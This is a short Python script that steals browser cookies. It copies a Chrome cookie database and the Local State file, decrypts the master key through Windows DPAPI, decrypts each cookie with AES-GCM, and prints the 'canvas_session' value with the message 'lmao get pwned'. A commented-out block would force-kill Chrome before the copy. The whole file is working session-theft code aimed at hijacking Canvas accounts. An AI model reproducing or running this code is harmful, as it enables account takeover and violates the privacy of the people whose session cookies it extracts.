import sqlite3
import json
import base64
from shutil import copyfile
from Cryptodome.Cipher import AES
import win32crypt




#cookie_file_name = "C:\\Users\\lando\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies"

#local_state_name = "C:\\Users\\lando\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

cookie_file_name = "C:\\Users\\lando\\OneDrive\\Desktop\\Cookies1"
local_state_name = "C:\\Users\\lando\\OneDrive\\Desktop\\Local State"

"""
import os
import time

# Kill chrome process
os.system("taskkill /im chrome.exe /f")

# Here is the adjustable timer after closing killing chrome
time.sleep(0.0)
"""


# Below is the code that copys the cookies file
copyfile(cookie_file_name, './Cookies')


# Grab the encrpytion key to the cookies
encrypted_key = None
with open(local_state_name, 'r') as file:
	encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']

encrypted_key = base64.b64decode(encrypted_key)
encrypted_key = encrypted_key[5:]
decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


con = sqlite3.connect('./Cookies')
cursor = con.cursor()

# Get the results
cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
for host_key, name, value, encrypted_value in cursor.fetchall():

  # Decrypt the encrypted_value
  try:
    # Try to decrypt as AES (2020 method)
    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
    decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
  except:
    # If failed try with the old method
    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0
  if name == "canvas_session":
    print("lmao get pwned:   {}".format(decrypted_value.decode("utf-8")))

con.close()